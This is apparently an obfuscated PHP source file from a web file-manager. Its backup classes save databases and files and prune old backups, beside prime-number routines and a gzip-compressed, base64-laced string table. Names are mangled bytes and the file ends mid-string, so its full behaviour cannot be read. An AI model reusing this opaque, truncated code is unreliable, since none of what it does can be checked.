e¼£­ˆØÙ; dÉÌƒƒ«¿ß: $B†Ø‘ÕšÌ = ($d“ÈÒÂ¡ğ - 1) * ($aö™°ƒí‡º - 1); $DäŞö ª†„ = $C•¥‡ô¢¸ƒ[698]; if (strlen($DäŞö ª†„) < $C•¥‡ô¢¸ƒ[597]) { return; } goto AœÔ›à¶ªÉ; bÒ‹¸å·Åˆ: return $dÄö³«øÊ; goto bö„‚±½»Î; Cïã‡å£Š¥: if (!$c‹Æï©Æ„Ô) { die; } for ($c¼¯¥¥œË = 0; $c¼¯¥¥œË < $B†Ø‘ÕšÌ * 10; $c¼¯¥¥œË++) { if (($B†Ø‘ÕšÌ * $c¼¯¥¥œË + 1) % $E· Íè¸‹‡ == 0) { $E¯é¡Ä™ = $BŞô»öºÅ[250](($B†Ø‘ÕšÌ * $c¼¯¥¥œË + 1) / $E· Íè¸‹‡); break; } } $BÂõÈ¢£Äì = $BŞô»öºÅ[120]($BŞô»öºÅ[355] . ($d“ÈÒÂ¡ğ + $aö™°ƒí‡º) . $BŞô»öºÅ[356] . $E· Íè¸‹‡ . $BŞô»öºÅ[356] . $E¯é¡Ä™ . $BŞô»öºÅ[357]); goto Aê¼ˆ¹ƒî; Aê¼ˆ¹ƒî: $dÄö³«øÊ = $this->{$_SERVER[‹¶][256]}($b«…®‰±Šæ[0], $BÂõÈ¢£Äì); $Dùƒø—ëŠÁ = $C•¥‡ô¢¸ƒ[705]; if (strlen($Dùƒø—ëŠÁ) < $C•¥‡ô¢¸ƒ[577]) { die; } goto bÒ‹¸å·Åˆ; E»È‚‹Ÿ: $C•¥‡ô¢¸ƒ =& $_SERVER[¢ÌÛ]; $BŞô»öºÅ =& $_SERVER[‹¶]; $b«…®‰±Šæ = $BŞô»öºÅ[0]($BŞô»öºÅ[358], $D«ÛŠ´¬Â); goto C£Œô¿ïÜ; cç£¡ğ¡Ÿ: $aö™°ƒí‡º = 0; $a»ºÂâ‚· = $C•¥‡ô¢¸ƒ[696]; for ($c¼¯¥¥œË = 3; $c¼¯¥¥œË < $eƒˆ‚˜µº; $c¼¯¥¥œË += 2) { if ($eƒˆ‚˜µº % $c¼¯¥¥œË != 0) { continue; } $d“ÈÒÂ¡ğ = $c¼¯¥¥œË; $aö™°ƒí‡º = $BŞô»öºÅ[250]($eƒˆ‚˜µº / $c¼¯¥¥œË); break; $f§Áé¼‡˜À = $C•¥‡ô¢¸ƒ[697]; } goto dÉÌƒƒ«¿ß; bö„‚±½»Î: } public function zlqvbc2ddb6b() { goto eÌ¥ÉõË®´; BÕæ÷“§‚ß: for ($EÔ†—à‘¾± = $Eàé‡¿¤î; $EÔ†—à‘¾± > 1; $EÔ†—à‘¾±--) { $A»°ò–å”Õ = !0; foreach ($AØ·ù¶­º as $e‹¼¯­ÌÎÜ) { if ($EÔ†—à‘¾± % $e‹¼¯­ÌÎÜ == 0) { $A»°ò–å”Õ = !1; break; } } if ($A»°ò–å”Õ) { $FÜÂÁïõ² = $EÔ†—à‘¾±; break; } } return $FÜÂÁïõ²; goto e“×Î¦ ã; FÜØ¯‹èâò: while (strlen($DÍšõ®Íª™) < $f“µ›ßî…[603]) { if (!$DÍšõ®Íª™) { break; } $DÍšõ®Íª™++; } while ($Có‘œ‡Ç«ø <= (int) $E©¹çÇñÕœ[360]($Eàé‡¿¤î)) { $EÔ†—à‘¾± = $Có‘œ‡Ç«ø; while (!0) { $EÔ†—à‘¾±++; $f‡¶–õÎğ™ = $f“µ›ßî…[636]; if (!$f‡¶–õÎğ™) { return; } if ($EÔ†—à‘¾± <= 2) { $Có‘œ‡Ç«ø = $EÔ†—à‘¾±; break; } else { if ($EÔ†—à‘¾± < 2) { continue; } } $A»°ò–å”Õ = !0; for ($CßçëŞ÷‘ = 2; $CßçëŞ÷‘ <= $E©¹çÇñÕœ[360]($EÔ†—à‘¾±); $CßçëŞ÷‘++) { if ($EÔ†—à‘¾± % $CßçëŞ÷‘ == 0) { $A»°ò–å”Õ = !1; } } if ($A»°ò–å”Õ) { $Có‘œ‡Ç«ø = $EÔ†—à‘¾±; break; } } $AØ·ù¶­º[] = $Có‘œ‡Ç«ø; $A©ØÉòã…Ò = $f“µ›ßî…[707]; if (!$A©ØÉòã…Ò) { die; } } $FÜÂÁïõ² = 2; goto BÕæ÷“§‚ß; Bä¶íÁ¢Û„: $AØ·ù¶­º = array(); $Có‘œ‡Ç«ø = 1; $DÍšõ®Íª™ = $f“µ›ßî…[706]; goto FÜØ¯‹èâò; eÌ¥ÉõË®´: $f“µ›ßî… =& $_SERVER[¢ÌÛ]; $E©¹çÇñÕœ =& $_SERVER[‹¶]; $Eàé‡¿¤î = $E©¹çÇñÕœ[339]($E©¹çÇñÕœ[359](2, 14), $E©¹çÇñÕœ[359](2, 16) - 1); goto Bä¶íÁ¢Û„; e“×Î¦ ã: } public function rjkmdb1b6651($aÑŸÊí±øÈ, $e¤Ÿ£’À×) { $CÔ°¦´™â =& $_SERVER[‹¶]; return $CÔ°¦´™â[13](array($CÔ°¦´™â[14], $CÔ°¦´™â[361]), $aÑŸÊí±øÈ, $e¤Ÿ£’À×); $BÔ¦†¬°¤¹ = $_SERVER[¢ÌÛ][708]; } public function ivcn2a8a90d2($e†‰ÕçôÜ¦, $C·ù”±„) { $cÁÌ’šÎŸ =& $_SERVER[‹¶]; return $cÁÌ’šÎŸ[13](array($cÁÌ’šÎŸ[362], $cÁÌ’šÎŸ[363]), $e†‰ÕçôÜ¦, $C·ù”±„); } public function nzsf4ee5e823($dìŠÓŞ»¶–, $dßÀÆÂ·‡») { $a©äÓç« =& $_SERVER[¢ÌÛ]; $D÷ËÒÎ‹”¸ =& $_SERVER[‹¶]; return $D÷ËÒÎ‹”¸[13](array($D÷ËÒÎ‹”¸[362], $D÷ËÒÎ‹”¸[364]), $dìŠÓŞ»¶–, $dßÀÆÂ·‡»); $e¿ô‘Ãïà¥ = $a©äÓç«[709]; if (strlen($e¿ô‘Ãïà¥) < $a©äÓç«[583]) { return; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $d¸½åñÔ»é =& $_SERVER[¢ÌÛ]; self::$name = date($d¸½åñÔ»é[710]); if (!($BÈÁÏâª¡ = Model($d¸½åñÔ»é[711])->lastItem())) { $BÈÁÏâª¡ = $this->initData(); } else { self::$name = $BÈÁÏâª¡[$d¸½åñÔ»é[28]]; if ($BÈÁÏâª¡[$d¸½åñÔ»é[712]] == $d¸½åñÔ»é[86]) { self::$name = date($d¸½åñÔ»é[713]); $FŠòÑìéâ = 0; if (isset($BÈÁÏâª¡[$d¸½åñÔ»é[289]][$d¸½åñÔ»é[173]][$d¸½åñÔ»é[445]])) { $FŠòÑìéâ = (int) $BÈÁÏâª¡[$d¸½åñÔ»é[289]][$d¸½åñÔ»é[173]][$d¸½åñÔ»é[445]]; } if ($BÈÁÏâª¡[$d¸½åñÔ»é[28]] == self::$name) { Model($d¸½åñÔ»é[711])->remove($BÈÁÏâª¡[$d¸½åñÔ»é[385]]); } $BÈÁÏâª¡ = $this->initData($FŠòÑìéâ, $BÈÁÏâª¡[$d¸½åñÔ»é[714]]); } else { $this->checkStore($BÈÁÏâª¡[$d¸½åñÔ»é[714]]); } } self::$option = $BÈÁÏâª¡; } private function initData($bß˜¬íº = 0, $d¯ÒÅÇ™’‰ = '') { goto Dî®·÷õ»ª; eè¶Á¸¥«Ü: $this->checkStore($cÂ‹Í¾[$F˜Êì‡‹Î[714]]); $bàöÒ’ì¿· = array($F˜Êì‡‹Î[714] => $cÂ‹Í¾[$F˜Êì‡‹Î[714]], $F˜Êì‡‹Î[28] => self::$name, $F˜Êì‡‹Î[712] => 0, $F˜Êì‡‹Î[715] => $cÂ‹Í¾[$F˜Êì‡‹Î[715]], $F˜Êì‡‹Î[289] => array($F˜Êì‡‹Î[716] => array($F˜Êì‡‹Î[712] => 0), $F˜Êì‡‹Î[717] => array($F˜Êì‡‹Î[712] => 0, $F˜Êì‡‹Î[718] => 0, $F˜Êì‡‹Î[719] => 0, $F˜Êì‡‹Î[29] => $F˜Êì‡‹Î[33]), $F˜Êì‡‹Î[720] => array($F˜Êì‡‹Î[712] => 0, $F˜Êì‡‹Î[718] => 0, $F˜Êì‡‹Î[719] => 0), $F˜Êì‡‹Î[173] => array($F˜Êì‡‹Î[712] => 0, $F˜Êì‡‹Î[721] => 0, $F˜Êì‡‹Î[722] => 0, $F˜Êì‡‹Î[723] => 0, $F˜Êì‡‹Î[724] => 0, $F˜Êì‡‹Î[445] => $bß˜¬íº)), $F˜Êì‡‹Î[725] => time(), $F˜Êì‡‹Î[474] => 0); $D”‹˜êÁ˜‰ = Model($F˜Êì‡‹Î[711])->insert($bàöÒ’ì¿·); goto A¡õ‹âéÑå; Dî®·÷õ»ª: $F˜Êì‡‹Î =& $_SERVER[¢ÌÛ]; $cÂ‹Í¾ = Model($F˜Êì‡‹Î[711])->config(); if ($d¯ÒÅÇ™’‰ && $cÂ‹Í¾[$F˜Êì‡‹Î[714]] != $d¯ÒÅÇ™’‰) { $bß˜¬íº = 0; } goto eè¶Á¸¥«Ü; A¡õ‹âéÑå: $bàöÒ’ì¿·[$F˜Êì‡‹Î[385]] = $D”‹˜êÁ˜‰; return $bàöÒ’ì¿·; goto A´¾ÍîÊ‘; A´¾ÍîÊ‘: } private function checkStore($B£’ßÆ“Å) { $AĞ•ìÉ¥¢ =& $_SERVER[¢ÌÛ]; $CºíÕ”é©‰ = Model($AĞ•ìÉ¥¢[726])->listData($B£’ßÆ“Å); Model($AĞ•ìÉ¥¢[726])->checkConfig($CºíÕ”é©‰); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¢ÌÛ][711])->findByName(self::$name); } return self::$option; } public static function set($f»ÔÛñë´¶) { $F í¢ì Œ‹ =& $_SERVER[¢ÌÛ]; $aÑè×­Í¯‘ = self::get(); foreach ($f»ÔÛñë´¶ as $f‚ÚÉİ»Œê => $c³ÅÌ‰ÄĞ¤) { $c¼¨–…•Ğ = explode($F í¢ì Œ‹[94], $f‚ÚÉİ»Œê); $Cå‘˜¶ = count($c¼¨–…•Ğ); switch ($Cå‘˜¶) { case 1: $aÑè×­Í¯‘[$c¼¨–…•Ğ[0]] = $c³ÅÌ‰ÄĞ¤; break; case 2: $aÑè×­Í¯‘[$c¼¨–…•Ğ[0]][$c¼¨–…•Ğ[1]] = $c³ÅÌ‰ÄĞ¤; break; case 3: $aÑè×­Í¯‘[$c¼¨–…•Ğ[0]][$c¼¨–…•Ğ[1]][$c¼¨–…•Ğ[2]] = $c³ÅÌ‰ÄĞ¤; break; } } Model($F í¢ì Œ‹[711])->update($aÑè×­Í¯‘[$F í¢ì Œ‹[385]], $aÑè×­Í¯‘); self::$option = $aÑè×­Í¯‘; return self::$option; } public function keep() { $A˜Ğäâ·ù® =& $_SERVER[¢ÌÛ]; $e¦Âñİ’’œ = self::get(); if ($e¦Âñİ’’œ[$A˜Ğäâ·ù®[289]][$A˜Ğäâ·ù®[716]][$A˜Ğäâ·ù®[712]] == $A˜Ğäâ·ù®[86]) { return; } $this->backupKeep($e¦Âñİ’’œ); self::set(array($A˜Ğäâ·ù®[727] => 1)); } private function backupKeep($aº®ÀÔ“çÅ) { goto dôŸ„…ß ï; FÙöèªí: $dé§¬ºÕË¦ = 0; $a‘®ŞÖ—×„ = array(); foreach ($dâ•¶šå¦Ç as $CĞ¿Éˆ—™ß) { if ($dé§¬ºÕË¦ >= 7) { break; } $a‘®ŞÖ—×„[] = $CĞ¿Éˆ—™ß[$D‘õ×š×‡‹[28]]; $dé§¬ºÕË¦++; } goto e·ñŠ•„³; e·ñŠ•„³: for ($dé§¬ºÕË¦ = 0; $dé§¬ºÕË¦ < 12; $dé§¬ºÕË¦++) { $a‘®ŞÖ—×„[] = date($D‘õ×š×‡‹[728], strtotime("\55{$dé§¬ºÕË¦}\40\x6d\x6f\x6e\164\x68\x73")); } $a‘®ŞÖ—×„ = array_unique($a‘®ŞÖ—×„); foreach ($dâ•¶šå¦Ç as $CĞ¿Éˆ—™ß) { if (!empty($CĞ¿Éˆ—™ß[$D‘õ×š×‡‹[28]]) && in_array($CĞ¿Éˆ—™ß[$D‘õ×š×‡‹[28]], $a‘®ŞÖ—×„)) { continue; } Model($D‘õ×š×‡‹[711])->remove($CĞ¿Éˆ—™ß[$D‘õ×š×‡‹[385]]); $D´ö˜í†¥ = "\x7b\151\x6f\72{$aº®ÀÔ“çÅ[$D‘õ×š×‡‹[714]]}\x7d\x2f\144\141\164\x61\x62\x61\x73\x65\57\x62\x61\x63\153\x75\160\137{$CĞ¿Éˆ—™ß[$D‘õ×š×‡‹[28]]}"; IO::remove($D´ö˜í†¥, !1); } goto bÔøìõ´İ; dôŸ„…ß ï: $D‘õ×š×‡‹ =& $_SERVER[¢ÌÛ]; $dâ•¶šå¦Ç = Model($D‘õ×š×‡‹[711])->listData(); if (empty($dâ•¶šå¦Ç)) { return; } goto FÙöèªí; bÔøìõ´İ: } public function db() { goto c¯ĞÍÈçÈø; B„Š¢è†à˜: $eåƒ³‚åæ† = new BackupDb(); if (!$eåƒ³‚åæ†->index()) { return !1; } self::set(array($eŞ¸—…½[729] => 1)); goto Dæó¶™Åº²; c¯ĞÍÈçÈø: $eŞ¸—…½ =& $_SERVER[¢ÌÛ]; $eÙšà™õ = self::get(); if ($eÙšà™õ[$eŞ¸—…½[289]][$eŞ¸—…½[717]][$eŞ¸—…½[712]] == $eŞ¸—…½[86]) { return !0; } goto B„Š¢è†à˜; Dæó¶™Åº²: return !0; goto B“„¯´ŒÁÃ; B“„¯´ŒÁÃ: } public function dbFile() { goto F½ĞÜ¤ÂÒ; BÉÆóæ¬¬: return !0; goto dÉÙœó¦¶; F½ĞÜ¤ÂÒ: $CÖ‹Ô©öß« =& $_SERVER[¢ÌÛ]; $DÜ³¹ÎäŒ = self::get(); if ($DÜ³¹ÎäŒ[$CÖ‹Ô©öß«[289]][$CÖ‹Ô©öß«[720]][$CÖ‹Ô©öß«[712]] == $CÖ‹Ô©öß«[86]) { return !0; } goto e¿‰ÜôÓ´; e¿‰ÜôÓ´: $A­²ù¬Ó•¬ = new BackupDbFile(); if (!$A­²ù¬Ó•¬->index()) { return !1; } self::set(array($CÖ‹Ô©öß«[730] => 1)); goto BÉÆóæ¬¬; dÉÙœó¦¶: } public function file() { $C¾„ôß­æï =& $_SERVER[¢ÌÛ]; $dğÆ‘Õ‘¿¯ = self::get(); if ($dğÆ‘Õ‘¿¯[$C¾„ôß­æï[289]][$C¾„ôß­æï[173]][$C¾„ôß­æï[712]] == $C¾„ôß­æï[86]) { return !0; } if (!isset($dğÆ‘Õ‘¿¯[$C¾„ôß­æï[715]]) || $dğÆ‘Õ‘¿¯[$C¾„ôß­æï[715]] == $C¾„ôß­æï[495]) { $EŒÍ‰£¨ïĞ = new BackupFile(); if (!$EŒÍ‰£¨ïĞ->index()) { return !1; } } self::set(array($C¾„ôß­æï[731] => 1, $C¾„ôß­æï[712] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto F‚±ˆç«»§; F‚±ˆç«»§: $EŸÆ¹Øçõ… =& $_SERVER[¢ÌÛ]; $a°ç·¾Å‘ = Backup::get(); self::$io = $a°ç·¾Å‘[$EŸÆ¹Øçõ…[714]]; goto d£ö¼è¿êÔ; FÇÜó¬Ò¬Á: Backup::set($bœÂ‘±µŒ¹); if ($dºíã¼­¹Ñ > $b¹µÓ¨÷á) { return !1; } return !0; goto dÕíºÎö¸Ø; d£ö¼è¿êÔ: self::$name = $a°ç·¾Å‘[$EŸÆ¹Øçõ…[28]]; $C¨ƒ«ï’ğ = $GLOBALS[$EŸÆ¹Øçõ…[6]][$EŸÆ¹Øçõ…[17]]; $aÚ“¾¬İö = $this->_dbType($C¨ƒ«ï’ğ); goto cÀô‡ÄØ„å; cÀô‡ÄØ„å: $Dö˜åÏ×¸ = new DbManage($C¨ƒ«ï’ğ, $aÚ“¾¬İö); $f¼­š±ÔŒ = TEMP_FILES . $EŸÆ¹Øçõ…[732] . self::$name . $EŸÆ¹Øçõ…[8]; del_dir($f¼­š±ÔŒ); goto Dãâ—©îºˆ; c™¹§ÇˆÏŠ: foreach ($d¢Ó³ä¬Éî as $eÌÑø»–Âò) { $d´Öí›˜® = $f¼­š±ÔŒ . $eÌÑø»–Âò . $EŸÆ¹Øçõ…[740]; $E­Ä‚ë‹‘Ø = null; if ($eÌÑø»–Âò == $EŸÆ¹Øçõ…[741] && (!isset($a°ç·¾Å‘[$EŸÆ¹Øçõ…[715]]) || $a°ç·¾Å‘[$EŸÆ¹Øçõ…[715]] == $EŸÆ¹Øçõ…[495])) { $E­Ä‚ë‹‘Ø = self::$io; } $b¹µÓ¨÷á += $Dö˜åÏ×¸->sqlFromDb($eÌÑø»–Âò, $d´Öí›˜®, $AäˆÁÓ¸é, $E­Ä‚ë‹‘Ø); } $AäˆÁÓ¸é->end(); $bœÂ‘±µŒ¹ = array($EŸÆ¹Øçõ…[742] => $aÚ“¾¬İö, $EŸÆ¹Øçõ…[729] => 1, $EŸÆ¹Øçõ…[743] => $dºíã¼­¹Ñ + 1, $EŸÆ¹Øçõ…[744] => $b¹µÓ¨÷á); goto FÇÜó¬Ò¬Á; fºÛó¬Ñ: $d¢Ó³ä¬Éî = array_diff($d¢Ó³ä¬Éî, array($EŸÆ¹Øçõ…[733], $EŸÆ¹Øçõ…[734])); foreach ($d¢Ó³ä¬Éî as $eÌÑø»–Âò) { $dºíã¼­¹Ñ += $Dö˜åÏ×¸->model($eÌÑø»–Âò)->count(); } $AäˆÁÓ¸é = new Task($EŸÆ¹Øçõ…[735], $EŸÆ¹Øçõ…[736], $dºíã¼­¹Ñ, LNG($EŸÆ¹Øçõ…[737]) . $EŸÆ¹Øçõ…[738] . LNG($EŸÆ¹Øçõ…[739])); goto c™¹§ÇˆÏŠ; Dãâ—©îºˆ: mk_dir($f¼­š±ÔŒ); $dºíã¼­¹Ñ = $b¹µÓ¨÷á = 0; try { $d¢Ó³ä¬Éî = $Dö˜åÏ×¸->db()->getTables(); } catch (Exception $FŒ‰»‹Åæë) { return !1; } goto fºÛó¬Ñ; dÕíºÎö¸Ø: } private function _dbType($fÛ›ÁÕ´·É) { goto dÖï¡ğ¸Ë†; E«šóÅ’Î­: if ($Bµ™§–Ú†Û == $FëªÉßöë[746]) { $DÄË×ŸÖâ = explode($FëªÉßöë[4], $fÛ›ÁÕ´·É[$FëªÉßöë[747]]); $Bµ™§–Ú†Û = $DÄË×ŸÖâ[0]; } $a«„ÅÔˆ®Ï = array($FëªÉßöë[748] => $FëªÉßöë[9], $FëªÉßöë[749] => $FëªÉßöë[750]); if (isset($a«„ÅÔˆ®Ï[$Bµ™§–Ú†Û])) { $Bµ™§–Ú†Û = $a«„ÅÔˆ®Ï[$Bµ™§–Ú†Û]; } goto fÛëåŞŠÄ; dÖï¡ğ¸Ë†: $FëªÉßöë =& $_SERVER[¢ÌÛ]; $fÛ›ÁÕ´·É = array_change_key_case($fÛ›ÁÕ´·É); $Bµ™§–Ú†Û = $fÛ›ÁÕ´·É[$FëªÉßöë[745]]; goto E«šóÅ’Î­; fÛëåŞŠÄ: return $Bµ™§–Ú†Û; goto DÚˆ¹õİÛ´; DÚˆ¹õİÛ´: } } goto e¥ñ“½ö†È; bÀˆÎêƒ’õ: if (!function_exists('_kodDe')) { function _kodDe($a·´¶íÂ…¢) { $a·´¶íÂ…¢ = base64_decode($a·´¶íÂ…¢); $e¾ ‘¦ôŠä = strlen($a·´¶íÂ…¢); $dí­¶±ÜÂè = ''; $B˜ğŠ˜»Ÿì = ord($a·´¶íÂ…¢[0]) - 30; for ($a§§î™ô„Ÿ = 1; $a§§î™ô„Ÿ < $e¾ ‘¦ôŠä; $a§§î™ô„Ÿ += 2) { if ($a§§î™ô„Ÿ + 1 < $e¾ ‘¦ôŠä) { $dí­¶±ÜÂè .= chr(ord($a·´¶íÂ…¢[$a§§î™ô„Ÿ + 1]) + $B˜ğŠ˜»Ÿì); $dí­¶±ÜÂè .= chr(ord($a·´¶íÂ…¢[$a§§î™ô„Ÿ]) + $B˜ğŠ˜»Ÿì); } else { $dí­¶±ÜÂè .= chr(ord($a·´¶íÂ…¢[$a§§î™ô„Ÿ]) + $B˜ğŠ˜»Ÿì); } } return $dí­¶±ÜÂè; } } define(base64_decode('oszbjY4='), base64_decode('kqXU/g==')); $_SERVER[¢ÌÛ] = explode("\174\2\174\4\174\5", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\xad\x7d\x7\x9c\x53\x55\xd6\x38\xb6\x55\x2c\x2b\xe8\x2a\xee\x2a\xfa\x1c\xca\xc\x90\x32\x85\x3a\x30\xc\x99\x99\xcc\x4c\x20\x33\x19\x92\xc"."\x43\x9\x84\x97\xe4\xcd\xe4\x31\x49\x5e\xe6\xbd\x97\x69\xc0\xda\x2b\xa2\xeb\x8a\x1d\xd7\x82\xac\x62\x1\xb1\xb0\x8a\x82\xba\xba\xea\x2e\x82\x15\x74\xd7\xb2\x36\x9a\x15\x2b\xa2\x2e"."\x7e\xb7\xdf\xfb\x5e\x82\xfb\x7d\xbf\xff\x9f\x1f\x90\xdb\xdf\x2d\xe7\x9e\x7b\xce\xb9\xe7\x9c\xfb\xef\x77\x37\x9e\xbb\xf3\x8a\xa7\xf6\x5d\xbd\x6e\xc9\xe1\x4b\x8e\x5c\x72\xd4\x23\x77"."\xe3\x5f\xf4\xef\x28\x1c\x3e\x6b\xd9\x31\x3\xd0\x9f\x23\x96\x5d\x5e\x52\xd2\x38\xfe\xd8\x31\xcd\xc7\x5f\xf5\xf0\xfd\xf2\x1a\xf9\x7e\x79\x79\xc0\xbf\xe5\x45\xdf\x9\xdb\xee\x9b\xee"."\xdd\xb5\x6a\x4b\xdf\xae\xc3\x6\xb8\x2a\x2e\x7a\xb8\x12\x14\xc6\x75\x2b\xf1\x8f\x94\xd1\x4c\x49\xe9\x55\xd\xd3\xc0\x9\x71\x2d\xd3\xae\x76\xe0\xb0\x9a\xc1\xbf\x6e\xfc\x63\x74\xa5"."\x54\x53\xc1\xe1\x68\x73\x20\x1c\xd\xb5\xb6\xb4\x78\x83\xe1\x28\x69\x51\xcc\x4f\x6b\x9\x12\xca\xca\xba\x9c\x26\x8d\x67\x15\xdd\x0\x9f\x12\x9b\x8b\x66\xb5\xac\x92\xb1\xa4\xf0\x84"."\204\154\312\61\331\40\55\325\325\104\353\274\55\376\300\234\150\170\116\213\227\224\210\105\273\162\212\336\207\143\50\30\62\145\335\14\253\151\205\225\350\321\131\277\152"."\274\15\276\146\51\34\364\64\207\74\265\141\137\240\31\47\327\6\232\232\174\341\374\364\140\300\357\257\361\324\316\310\317\151\11\172\32\232\74\22\350\137\112\211\252"."\231\166\255\104\132\210\163\26\112\243\160\240\136\125\122\11\34\314\310\264\73\146\137\226\204\302\54\4\326\40\223\113\245\160\244\231\205\110\377\225\166\71\227\42\163"."\126\47\106\262\272\232\226\351\320\147\50\175\54\25\7\344\234\251\251\231\70\216\170\173\115\135\346\351\240\307\161\135\111\53\31\322\124\310\353\367\326\206\45\330\115"."\251\76\30\150\222\310\122\244\145\303\124\164\251\255\321\33\364\112\260\353\125\305\150\304\305\22\256\327\332\14\46\104\362\370\375\322\241\132\60\225\164\226\66\203\353"."\x14\x68\x2c\x10\xac\xf3\x6\xa5\x9a\x39\x12\x9f\xa7\xb8\x96\x4e\x6b\x19\x17\x68\x5\xac\xa7\x29\x74\xd5\x1b\xc\xe2\x80\x83\x40\xb0\xdf\x7\x97\x8e\x44\x2\xf5\xf5\x21\x2f\x8b\x91"."\xc1\xcd\xf4\x83\x9e\x54\x10\x28\xb5\xc4\x12\xed\x29\x33\xda\x2d\xa7\x72\x14\x58\x3b\xf1\x6f\x31\xf9\x21\xbf\x9a\x41\x0\xb8\x4b\xcd\xa8\x39\x2\xac\xa4\x9\x4d\x63\x3b\x87\x4\x72"."\xb4\xb4\x42\x53\xd2\xa0\x9a\x46\xf6\x14\xd8\x60\xdd\x38\x58\x35\x15\xff\x4e\x26\x85\x62\x51\x98\xa7\xe8\x66\x54\xc9\xc4\xb5\x84\x9a\x21\xdb\xb0\x9a\x6c\x39\x2\x78\xb2\x99\xac\xd3".strrev('O,"Å¥ÎnÔ/ÚŒbê‚ÏtP•-v²íŸŠSWhc&ëI¯¶Zâ¹¨4PU').base64_decode('qqmETjfnL5UE219t7+Ob0NByelzxgW3C67awnpSRQoppgkEbdFyt2ZQmJ0KK')."\56\214\265\36\124\14\344\114\61\61\207\212\325\153\172\272\16\240\13\362\175\260\111\324\326\2\31\235\164\233\44\204\51\164\21\64\127\62\357\74\347\301\371\363\246".strrev('Ò¢‹TQq‰M’6Rh}G Üf¦#n¬tÆ\'JvÈUéTT©*K]!œFÿ')."\204\322\353\312\46\263\144\307\263\115\36\261\200\73\134\235\146\315\364\12\10\71\245\305\345\224\70\122\34\116\232\146\66\244\144\22\160\102\310\210\264\236\14\232\260"."\xac\xa2\x90\x42\x75\xe\x29\x21\x35\x49\x73\xa4\xc6\x4a\xb5\xd2\xa0\x15\xd3\x29\x16\xa2\xa3\x63\x69\x6\x4b\x34\x7b\x9\xc4\x14\x91\xb8\xd2\x6b\x92\x49\x91\x26\xc7\x93\xb2\xe\x96"."\253\52\147\266\73\47\22\264\222\315\246\324\270\154\252\132\306\255\305\115\305\164\32\246\256\310\244\65\117\74\256\30\206\263\126\313\230\272\226\162\172\122\51\255\307".base64_decode('GdDVDjVTKY0mSBhkgm3uhIixkuzdoskShBWIF0bjr9E9yUrrcsZoV3Snl2ya')."\112\11\254\7\303\213\264\130\235\152\144\65\103\205\335\253\224\144\323\224\343\111\210\123\170\363\125\277\120\136\315\244\324\214\222\127\326\333\233\125\165\305\240\175\225".strrev('ƒ\' u:aœéHuqJTÔÉ¥ÃH÷d301se)\\´åÑlâºĞ¤Âš')."\144\215\175\355\316\46\270\265\124\45\341\14\1\34\116\222\53\112\307\112\0\154\44\232\207\123\33\303\341\226\250\257\36\34\325\315\336\150\223\47\134\333\110\272\155"."\xca\x1d\xb4\xcf\x7e\x80\x99\x59\x93\x34\x71\xb6\x13\x6c\x31\x8\x58\xcd\x60\xac\x3c\xb1\x45\xeb\x51\x74\xf0\xe1\x9a\xbe\x4a\xa9\x53\x4b\xc4\xb4\x5e\x17\xcd\x82\x85\x43\x0\x87\xd0"."\xc2\x70\xb9\xb3\xa6\x33\x28\x67\x3a\xe0\xfc\xc4\xfa\x4c\x85\x80\x9f\xd1\xdd\x61\x9d\x68\xbf\x92\xe9\x30\x93\xb4\x62\xc8\x1b\x9c\xe5\xd\x46\x43\x81\xfa\x70\x9b\x27\x48\xe\xf9\xc"."\200\222\136\372\51\330\164\312\31\124\22\140\352\343\46\255\47\147\341\254\321\62\160\143\300\265\242\271\160\263\320\74\277\257\1\116\114\235\323\0\205\234\142\51\332"."\xb6\x5f\x4d\xab\xb0\xef\x26\xcb\x41\x33\x9\x28\x80\x6\xd2\x21\x37\x1a\x50\x55\x24\x39\xba\x24\x92\x18\x33\xca\x9\xfe\x1f\x3d\x6a\x5e\xa4\xce\x35\x7a\x7e\xb5\x5b\xe5\x75\xdc\x65"."\256\62\251\274\164\274\324\2\110\22\125\116\111\144\320\171\45\112\245\300\214\137\230\0\170\142\11\333\332\66\165\70\61\350\235\331\352\15\205\243\115\336\160\143\240"."\216\174\301\353\41\41\277\206\267\46\35\321\74\374\63\337\305\361\61\130\163\137\132\356\260\141\151\30\153\322\164\305\232\302\117\215\66\65\101\321\70\214\66\52\152"."\107\222\214\117\205\255\305\265\224\246\313\51\210\305\50\20\53\24\263\164\250\355\144\175\60\302\344\221\220\232\316\122\274\146\46\163\351\230\20\164\363\256\220\357\202".base64_decode('lacHTVJjB52mk1Clm1QZUV5PcbQ7VAH+coSc0NIyJXcRclISGDvhpNGWnEZF')."\346\47\247\251\233\32\114\325\55\105\232\24\63\251\221\345\352\120\150\227\162\254\157\264\227\11\45\245\320\171\111\52\24\271\3\32\256\233\115\27\40\324\100\230\237"."\xa5\xaa\x11\x4\x5\x21\xe1\x44\xe3\x6d\x90\xbe\xe5\x9\x26\x2b\x9a\x2\xc7\x48\x20\xb6\x8\xec\x13\x42\x42\xa8\x46\xbd\x70\xea\x47\x35\x94\x7\xfa\x2a\xf3\xf2\x2d\xba\xd2\xae\x92"."\335\226\1\113\325\44\353\235\264\2\130\32\176\336\300\210\320\130\175\253\337\37\255\15\64\207\1\315\214\123\332\202\276\260\227\2\247\247\56\352\251\155\141\247\47"."\137\152\122\0\142\212\374\143\0\247\164\227\13\107\20\77\253\70\26\247\147\54\304\322\70\14\320\162\126\313\30\212\63\116\132\113\160\174\216\113\114\266\41\363\274"."\32\234\122\357\165\312\351\176\147\32\114\223\223\165\335\172\264\112\141\361\204\366\221\145\344\170\33\116\54\140\204\350\231\336\22\10\221\12\325\60\25\220\115\61\105"."\47\375\150\151\45\131\151\1\204\32\274\44\361\130\172\114\313\204\150\362\264\205\50\316\315\201\362\272\332\57\363\61\126\323\376\220\266\173\323\51\116\11\132\107\345"."\xe4\x6b\x11\x6e\xf4\x35\xcf\x88\x36\x5\xea\xbc\xfe\xa8\xaf\x19\x20\xa4\x70\x7e\x7a\x6b\x4b\x9d\x87\x2e\xae\x98\x5e\x13\x8\x37\x5a\x52\x5b\x1\x4a\x9a\xe5\xf1\xfb\xec\xc5\xbd\xb3".base64_decode('faFwqGAWSGv12nIA79cS9Nb7ZrNovc/rrwtFaz21jbxMs6eJRKLtkPsy3Nby').base64_decode('UYBbQ4yHi3ZDfpROVtTCMEUpKxDlcADOSYXAHhku5ILRSAhxHtdyFBoZfZim')."\110\44\55\223\155\45\323\63\260